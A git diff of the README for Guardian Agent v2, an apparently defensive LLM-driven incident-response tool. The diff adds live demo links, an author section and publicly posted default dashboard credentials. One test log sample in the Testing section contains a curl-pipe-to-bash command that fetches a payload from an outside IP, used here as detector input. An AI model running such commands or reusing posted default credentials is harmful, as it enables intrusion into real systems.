@@ -8,6 +8,11 @@
 
 <br/>
 
+[![🚀 Live Demo](https://img.shields.io/badge/🚀_LIVE_DEMO-guardian--agent--v2.vercel.app-00D4FF?style=for-the-badge)](https://guardian-agent-v2.vercel.app)
+[![⚙️ API](https://img.shields.io/badge/⚙️_LIVE_API-Railway-FF4F00?style=for-the-badge)](https://web-production-f295.up.railway.app/api/stats)
+
+<br/>
+
 ![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
 ![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)
 ![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
@@ -26,6 +31,18 @@
 ![VirusTotal](https://img.shields.io/badge/VirusTotal-70%2B%20AV%20Engines-red)
 
 </div>
+
+---
+
+## 🌐 Try It Live
+
+| Service | URL | Credentials |
+|---------|-----|-------------|
+| 🖥️ **Dashboard** | [guardian-agent-v2.vercel.app](https://guardian-agent-v2.vercel.app) | `admin` / `guardian123` |
+| ⚙️ **API** | [web-production-f295.up.railway.app](https://web-production-f295.up.railway.app/api/stats) | Public |
+| 📖 **API Docs** | [/docs](https://web-production-f295.up.railway.app/docs) | Public |
+
+> **Quick test:** Log in → click **Submit Log** → choose **Ransomware** preset → watch the agent work in real time.
 
 ---
 
@@ -74,35 +91,38 @@ Total time from attack to containment: 76 seconds.
 ## 🏗️ Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                     GUARDIAN AGENT v2                        │
-│                                                              │
-│  ┌──────────┐    ┌──────────────────────────────────────┐   │
-│  │  Log     │    │         LangGraph Pipeline            │   │
-│  │  Sources │───▶│                                      │   │
-│  │          │    │  ANALYZER → INVESTIGATOR → MITIGATOR │   │
-│  │ • Manual │    │               ↓                      │   │
-│  │ • Watcher│    │    HITL ── Human Approval ────────── │   │
-│  │ • Cron   │    │               ↓                      │   │
-│  └──────────┘    │  EXECUTOR → REPORT                   │   │
-│                  └──────────────────┬───────────────────┘   │
-│                                     │                        │
-│  ┌──────────────┐    ┌──────────────▼─────────────────────┐ │
-│  │ Threat Intel │    │         FastAPI Backend             │ │
-│  │              │    │                                     │ │
-│  │ • AbuseIPDB  │◀──▶│  REST API + WebSocket Streaming    │ │
-│  │ • VirusTotal │    │  JWT Auth + SQLite Persistence      │ │
-│  └──────────────┘    └──────────────┬─────────────────────┘ │
-│                                     │                        │
-│  ┌──────────────┐    ┌──────────────▼─────────────────────┐ │
-│  │ Integrations │    │       React Dashboard               │ │
-│  │              │    │                                     │ │
-│  │ • Okta       │    │  Live Pipeline • HITL Approval      │ │
-│  │ • Azure AD   │    │  PDF Export • Incident History      │ │
-│  │ • Slack      │    │  Login Page • System State          │ │
-│  │ • Email      │    └─────────────────────────────────────┘ │
-│  └──────────────┘                                            │
-└──────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────┐
+│                      GUARDIAN AGENT v2                           │
+│                                                                  │
+│  ┌──────────┐    ┌────────────────────────────────────────────┐  │
+│  │  Log     │    │           LangGraph Pipeline               │  │
+│  │  Sources │───▶│                                            │  │
+│  │          │    │  ANALYZER → INVESTIGATOR → MITIGATOR       │  │
+│  │ • Manual │    │               ↓                            │  │
+│  │ • Watcher│    │    HITL ── Human Approval ─────────────    │  │
+│  │ • Cron   │    │               ↓                            │  │
+│  └──────────┘    │  EXECUTOR → REPORT                         │  │
+│                  └──────────────────┬──────────────────────┘  │  │
+│                                     │                           │
+│  ┌──────────────┐    ┌──────────────▼───────────────────────┐  │
+│  │ Threat Intel │    │         FastAPI Backend               │  │
+│  │              │    │                                       │  │
+│  │ • AbuseIPDB  │◀──▶│  REST API + WebSocket Streaming       │  │
+│  │ • VirusTotal │    │  JWT Auth + SQLite Persistence        │  │
+│  └──────────────┘    └──────────────┬───────────────────────┘  │
+│                                     │                           │
+│  ┌──────────────┐    ┌──────────────▼───────────────────────┐  │
+│  │ Integrations │    │        React Dashboard                │  │
+│  │              │    │                                       │  │
+│  │ • Okta       │    │  Live Pipeline • HITL Approval        │  │
+│  │ • Azure AD   │    │  PDF Export • Incident History        │  │
+│  │ • Slack      │    │  Login Page • System State            │  │
+│  │ • Email      │    └───────────────────────────────────────┘  │
+│  └──────────────┘                                               │
+└─────────────────────────────────────────────────────────────────┘
+
+        Vercel (Frontend)          Railway (Backend)
+   guardian-agent-v2.vercel.app    web-production-f295.up.railway.app
 ```
 
 ---
@@ -130,28 +150,27 @@ Total time from attack to containment: 76 seconds.
 - **Cyberpunk dark theme** with real-time pipeline visualization
 - **WebSocket streaming** — watch each pipeline node complete live
 - **Incident history** — full searchable audit trail
-- **System State** — view all blocked IPs, hashes, and quarantined hosts
-- **JWT Login** — secure authentication for the dashboard
+- **JWT Login** — secure authentication
 
 ### 📨 Notifications
-- **Slack** — rich formatted alerts with direct links back to dashboard
-- **Email** — dark-themed HTML incident reports via SMTP/Gmail
+- **Slack** — rich formatted alerts with direct links to dashboard
+- **Email** — HTML incident reports via SMTP/Gmail
 - **3 automated messages** per incident: created → approval needed → complete
 
 ### 📄 PDF Reports
-- Professional incident report auto-generated per incident
-- Includes IOC table, threat intel results, mitigation plan, executed actions, raw log
-- Downloadable with one click from the dashboard
+- Professional report auto-generated per incident
+- Includes IOC table, threat intel, mitigation plan, executed actions, raw log
+- One-click download from the dashboard
 
 ### ⏰ Automated Scanning
 - **File Watcher** — drop a `.log` file, analysis begins instantly
-- **Cron Scheduler** — scans a directory automatically at configurable intervals
+- **Cron Scheduler** — scans a directory at configurable intervals
 - **Deduplication** — content-hashed, won't resubmit the same log twice
 
 ### 🔒 Enterprise Integrations
-- **Okta** — suspend compromised user accounts via Lifecycle API
+- **Okta** — suspend compromised accounts via Lifecycle API
 - **Azure AD** — disable users via Microsoft Graph API
-- **Firewall** — IP blocking (JSON mock, swappable for Palo Alto/AWS SG API)
+- **Firewall** — IP blocking (JSON mock, swappable for real firewall API)
 
 ---
 
@@ -184,22 +203,18 @@ guardian_agent_v2/
 ├── frontend/
 │   └── src/
 │       ├── App.jsx            # Main app + routing + auth
-│       ├── index.css          # Cyberpunk dark theme
 │       ├── pages/
 │       │   ├── Dashboard.jsx       # Incident list + live stats
 │       │   ├── IncidentDetail.jsx  # Live view + approval UI + PDF
 │       │   ├── Login.jsx           # JWT authentication page
 │       │   ├── SubmitLog.jsx       # Manual log submission + presets
 │       │   └── SystemState.jsx     # Firewall/blocklist/users viewer
-│       ├── components/
-│       │   └── IncidentRow.jsx
 │       └── hooks/
 │           └── useApi.js      # API hooks + WebSocket client
+├── Dockerfile                 # Container definition
+├── run.py                     # Production entry point
 ├── .env.example               # Environment variable template
-├── requirements.txt
-├── Procfile                   # Railway deployment
-├── railway.json               # Railway service config
-└── nixpacks.toml              # Build config
+└── requirements.txt
 ```
 
 ---
@@ -207,7 +222,6 @@ guardian_agent_v2/
 ## 🚀 Quick Start
 
 ### Prerequisites
-
 - Python 3.11+
 - Node.js 18+
 - [Groq API key](https://console.groq.com) — free
@@ -217,14 +231,13 @@ guardian_agent_v2/
 ### 1. Clone & Install
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/guardian-agent-v2.git
+git clone https://github.com/Nauman123-coder/guardian-agent-v2.git
 cd guardian-agent-v2
 
 # Python backend
 python -m venv .venv
 source .venv/Scripts/activate     # Windows
 # source .venv/bin/activate       # Linux/macOS
-
 pip install -r requirements.txt
 
 # React frontend
@@ -237,7 +250,7 @@ cd frontend && npm install && cd ..
 cp .env.example .env
 ```
 
-Open `.env` and fill in your keys:
+Fill in your keys:
 
 ```dotenv
 GROQ_API_KEY=your_groq_api_key
@@ -253,13 +266,11 @@ GUARDIAN_JWT_SECRET=your_long_random_secret
 
 ### 3. Run
 
-Open **3 terminals**:
-
 ```bash
-# Terminal 1 — Backend API
+# Terminal 1 — Backend
 uvicorn app.api.server:app --reload --port 8000
 
-# Terminal 2 — React Dashboard
+# Terminal 2 — Frontend
 cd frontend && npm start
 
 # Terminal 3 — File Watcher (optional)
@@ -272,8 +283,9 @@ Open **http://localhost:3000** → log in → submit your first log 🎯
 
 ## 🧪 Testing
 
-### Preset Attacks (Dashboard)
+### Preset Attacks
 Go to **Submit Log** and choose:
+
 | Preset | Risk | Description |
 |--------|------|-------------|
 | 🔴 Brute Force | 9/10 | SSH attack with account compromise |
@@ -288,13 +300,6 @@ Accepted password for backup_svc from 185.220.101.47
 backup_svc executed: curl http://194.165.16.11/payload.sh | bash" > watched_logs/attack.log
 ```
 
-### Direct API Test
-```bash
-curl -X POST http://localhost:8000/api/incidents \
-  -H "Content-Type: application/json" \
-  -d '{"raw_log": "Failed login from 185.220.101.47", "log_source": "ssh"}'
-```
-
 ---
 
 ## 🔌 API Reference
@@ -302,19 +307,15 @@ curl -X POST http://localhost:8000/api/incidents \
 | Method | Endpoint | Description |
 |--------|----------|-------------|
 | `POST` | `/api/auth/login` | Login → JWT token |
-| `GET` | `/api/stats` | Dashboard summary counts |
+| `GET` | `/api/stats` | Dashboard summary |
 | `GET` | `/api/incidents` | List all incidents |
-| `GET` | `/api/incidents/{id}` | Get single incident |
 | `POST` | `/api/incidents` | Submit log for analysis |
 | `POST` | `/api/incidents/{id}/approve` | Approve mitigation |
 | `POST` | `/api/incidents/{id}/deny` | Deny mitigation |
 | `GET` | `/api/incidents/{id}/report.pdf` | Download PDF report |
-| `GET` | `/api/state` | Firewall/blocklist state |
-| `GET` | `/api/scheduler/status` | Scheduler status |
-| `POST` | `/api/scheduler/scan` | Trigger manual scan |
 | `WS` | `/ws/incidents/{id}` | Live event stream |
 
-Interactive docs: **http://localhost:8000/docs**
+Full docs: **[web-production-f295.up.railway.app/docs](https://web-production-f295.up.railway.app/docs)**
 
 ---
 
@@ -323,62 +324,42 @@ Interactive docs: **http://localhost:8000/docs**
 | Variable | Description | Default |
 |----------|-------------|---------|
 | `GROQ_API_KEY` | Groq LLM API key | Required |
-| `GROQ_MODEL` | Model name | `llama-3.3-70b-versatile` |
 | `ABUSEIPDB_API_KEY` | AbuseIPDB key | Optional (mock fallback) |
 | `VIRUSTOTAL_API_KEY` | VirusTotal key | Optional (mock fallback) |
 | `SLACK_ENABLED` | Enable Slack alerts | `false` |
-| `SLACK_WEBHOOK_URL` | Slack webhook URL | — |
-| `EMAIL_ENABLED` | Enable email alerts | `false` |
-| `EMAIL_SMTP_USER` | Gmail address | — |
-| `EMAIL_SMTP_PASS` | Gmail app password | — |
-| `EMAIL_TO` | Alert recipient | — |
 | `GUARDIAN_AUTH_ENABLED` | Enable login page | `false` |
-| `GUARDIAN_ADMIN_USER` | Dashboard username | `admin` |
 | `GUARDIAN_ADMIN_PASS` | Dashboard password | `guardian123` |
 | `GUARDIAN_JWT_SECRET` | JWT signing secret | **Change this!** |
 | `SCHEDULER_ENABLED` | Enable auto-scanning | `false` |
-| `SCHEDULER_INTERVAL_MINUTES` | Scan frequency | `60` |
 | `OKTA_DOMAIN` | Okta org domain | Optional |
-| `OKTA_API_TOKEN` | Okta SSWS token | Optional |
 | `AZURE_TENANT_ID` | Azure AD tenant ID | Optional |
-| `AZURE_CLIENT_ID` | Azure app client ID | Optional |
-| `AZURE_CLIENT_SECRET` | Azure client secret | Optional |
 
 ---
 
 ## 🌐 Deployment
 
 ### Backend → Railway
-
-```bash
-# 1. Push to GitHub
-git push origin main
-
-# 2. Go to railway.app → New Project → Deploy from GitHub
-# 3. Add all environment variables in Railway dashboard
-# 4. Railway auto-deploys on every push ✅
-```
+1. Push to GitHub
+2. [railway.app](https://railway.app) → New Project → Deploy from GitHub
+3. Add environment variables in Railway dashboard
+4. Auto-deploys on every push ✅
 
 ### Frontend → Vercel
-
-```bash
-# 1. Go to vercel.com → New Project → Import repo
-# 2. Set Root Directory to: frontend
-# 3. Add env variable: REACT_APP_API_URL=https://your-backend.railway.app
-# 4. Deploy ✅
-```
+1. [vercel.com](https://vercel.com) → New Project → Import repo
+2. Set Root Directory to `frontend`
+3. Add `REACT_APP_API_URL=https://your-backend.railway.app`
+4. Deploy ✅
 
 ---
 
 ## 🗺️ Roadmap
 
-- [ ] Risk scoring history — track repeat offender IPs/hashes across incidents
+- [ ] Risk scoring history — track repeat offender IPs across incidents
 - [ ] Multi-user dashboard — analyst / responder / admin roles
 - [ ] Threat hunting — natural language search across all incidents
 - [ ] SIEM integration — Splunk / Elastic log streaming
 - [ ] CrowdStrike integration — real host isolation API
 - [ ] Palo Alto firewall — real IP blocking via PAN-OS API
-- [ ] Mobile push notifications
 
 ---
 
@@ -404,7 +385,32 @@ REPORT        → saves to SQLite, generates PDF, sends Slack + email
 
 Traditional SIEM rules: `if source_ip in blocklist → alert`
 
-Guardian: understands **context**, handles **novel attacks**, explains **reasoning**, processes **ambiguous logs** — because it uses a real language model, not pattern matching.
+Guardian understands **context**, handles **novel attacks**, explains **reasoning**, and processes **ambiguous logs** — because it uses a real language model, not just pattern matching.
+
+---
+
+## 👨‍💻 Built By
+
+<div align="center">
+
+<br/>
+
+**Nauman Ali Shah**
+
+*Cybersecurity Engineer & AI Developer*
+
+<br/>
+
+[![GitHub](https://img.shields.io/badge/GitHub-Nauman123--coder-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nauman123-coder)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Nauman_Ali_Shah-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/nauman-ali-shah-27387b351)
+
+<br/>
+
+*If this project helped you or impressed you, please give it a ⭐ — it means a lot!*
+
+*Feel free to reach out on LinkedIn for collaborations, freelance work, or just to talk cybersecurity.*
+
+</div>
 
 ---
 
@@ -416,10 +422,6 @@ MIT License — see [LICENSE](LICENSE) for details.
 
 <div align="center">
 
-Built with ❤️ by **Nauman Ali Shah**
-
-*If this helped you, please give it a ⭐ — it means a lot!*
+*Guardian Agent v2 — Because 76 seconds is better than 45 minutes.* 🛡️
 
 </div>
-
-# updated
